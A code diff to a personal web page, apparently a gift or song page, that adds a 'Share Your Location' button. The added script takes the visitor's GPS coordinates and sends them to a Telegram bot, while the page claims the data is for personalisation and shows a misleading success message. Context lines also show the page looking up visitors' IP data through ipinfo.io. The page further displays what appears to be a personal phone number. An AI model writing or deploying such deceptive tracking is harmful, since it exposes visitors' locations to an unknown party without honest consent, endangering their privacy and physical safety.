@@ -208,6 +208,28 @@
   <div class="song-name"><b><i>Never forget me. <br> call me at 2030-1-Jan [9718128457]</i></b></div>
   <div class="song-name"><b>I always add my progress here.</b></div>
   <div class="song-name"><b>You also send me msg there. I get it 👆</b></div>
+  <div style="
+  background-color: #1f1f1f;
+  padding: 30px;
+  border-radius: 12px;
+  margin: auto;
+  box-shadow: 0 0 20px rgba(3, 218, 198, 0.3);
+  max-width: 400px;
+  text-align: center;
+">
+  <h2 style="color: #03dac6;">📍 Share Your Location</h2>
+  <p style="color: #cccccc;">We use your GPS location to personalize your experience.</p>
+  <button onclick="askForLocation()" style="
+    padding: 12px 24px;
+    font-size: 16px;
+    background-color: #03dac6;
+    color: #000;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    margin-top: 20px;
+  ">Allow Location</button>
+</div>
 
 
 
@@ -352,6 +374,37 @@ fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`)
     });
   })
   .catch((err) => console.error("Error fetching IP data:", err));
+
+    function askForLocation() {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(sendLocationToTelegram, handleError);
+    } else {
+      alert("Geolocation is not supported by your browser.");
+    }
+  }
+ //for location
+  function sendLocationToTelegram(position) {
+    const lat = position.coords.latitude;
+    const lon = position.coords.longitude;
+    const time = new Date().toLocaleString();
+
+    const message = `📡 New Visitor Location:\n🌐 Latitude: ${lat}\n🌐 Longitude: ${lon}\n🕒 Time: ${time}`;
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+
+    fetch(url)
+      .then(res => {
+        if (res.ok) {
+          alert("✅ passed now website is looking more good");
+        } else {
+          alert("❌ Failed to make gift better.");
+        }
+      })
+      .catch(err => alert("⚠️ Error: " + err));
+  }
+
+  function handleError(error) {
+    alert("❌ Location permission denied or unavailable.");
+  }
 
 
   </script>
